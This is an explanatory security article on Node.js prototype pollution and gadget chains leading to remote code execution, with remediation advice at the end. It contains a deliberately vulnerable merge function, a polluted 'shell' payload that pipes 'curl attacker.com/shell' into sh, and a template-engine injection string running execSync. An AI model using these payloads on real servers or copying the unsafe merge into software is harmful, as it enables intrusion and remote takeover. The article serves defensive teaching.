Node.js Prototype Pollution: How Gadgets Lead to RCE

Prototype pollution is a critical vulnerability class in JavaScript where an attacker manipulates the base Object.prototype, causing injected properties to be inherited across all objects in the runtime. While altering prototype properties is harmless in isolation, it becomes severe when combined with "gadgets"—pre-existing code fragments in Node.js core or third-party dependencies that unsafely trust these inherited attributes. This article explains the technical mechanics behind prototype pollution gadgets and demonstrates how attackers leverage them to escalate property injection into arbitrary remote code execution (RCE).

The Foundation: Prototype Pollution

In JavaScript, objects inherit properties from prototypes via a prototype chain. When an application recursively merges, clones, or sets values based on untrusted user input without proper sanitization, an attacker can supply keys such as __proto__ or constructor.prototype.

// Vulnerable merge operation
function merge(target, source) {
    for (let key in source) {
        if (typeof target[key] === 'object' && typeof source[key] === 'object') {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// Attacker input
merge({}, JSON.parse('{"__proto__": {"polluted": true}}'));
console.log({}.polluted); // true

Once Object.prototype is polluted, any object in the Node.js process that does not explicitly define that property will inherit the attacker's value.

What Is a Gadget?

A gadget is an existing piece of application code or library logic that:

  1. Reads a configuration property from an uninitialized or partially defined object.
  2. Uses that property in a sensitive operation (such as file handling, process execution, or dynamic code evaluation) without checking Object.prototype.hasOwnProperty().

When prototype pollution takes place, the uninitialized property resolves up the prototype chain to the value provided by the attacker, redirecting the control flow.

Escalation Path 1: Process Execution via Child Processes

The most direct route to RCE involves the Node.js child_process module (spawn, fork, exec). When child_process.spawn() or related functions are invoked, they typically accept an options object. If an application invokes child_process.spawn('ls', [], options) where options is empty or lacks specific flags, properties fall back to the prototype chain.

Notable gadget properties include:

  • shell: Setting shell to a path (e.g., /bin/sh or cmd.exe) forces execution through a command interpreter.
  • NODE_OPTIONS via env: If the gadget allows injecting into options.env, an attacker can specify NODE_OPTIONS="--require /path/to/payload" or --eval flags when a secondary Node process is created via child_process.fork().
  • argv0: Alters the first argument passed to the spawned process, which can manipulate command execution context.

If Object.prototype.shell is polluted with "/bin/sh -c 'curl attacker.com/shell | sh' #", subsequent calls to child_process.spawn that do not explicitly declare options.shell will execute the payload instead of the intended command.

Escalation Path 2: Template Engines

Many server-side templating engines (such as EJS, Pug, or Handlebars) compile templates into raw JavaScript functions at runtime for performance optimization. These compilation steps often look for internal configuration properties that are not typically set in standard user options.

For example, in vulnerable versions of template engines, options such as:

  • outputFunctionName
  • client
  • escapeFunction

are checked during compilation. If an attacker pollutes Object.prototype.outputFunctionName with a string containing raw JavaScript syntax (e.g., x;process.mainModule.require('child_process').execSync('whoami');), the template engine concatenates this string directly into the dynamically generated function body created via new Function(...). When the template renders, the payload executes.

Escalation Path 3: Dynamic Module Loading

Node.js internal file resolution or third-party loaders often construct paths dynamically using configuration objects. If an attacker can pollute attributes like paths, extensions, or main, they can trick the runtime into loading an attacker-controlled file or an arbitrarily uploaded script via require() or import(), executing malicious logic upon resolution.

Remediation and Defense

Preventing gadget exploitation requires addressing both the root injection vector and the gadget execution environment:

  • Prevent Pollution at Input Boundaries: Validate all JSON schemas to reject keys named __proto__, constructor, and prototype.
  • Use Prototype-less Objects: Store dynamic key-value pairs in objects created with Object.create(null) or use Map primitives instead of standard objects.
  • Freeze the Prototype: Execute Object.freeze(Object.prototype) early in the application lifecycle to prevent any modifications at runtime.
  • Node.js Flags: Run Node.js with the --disable-proto=throw or --disable-proto=delete command-line flag to restrict access to Object.prototype.__proto__.
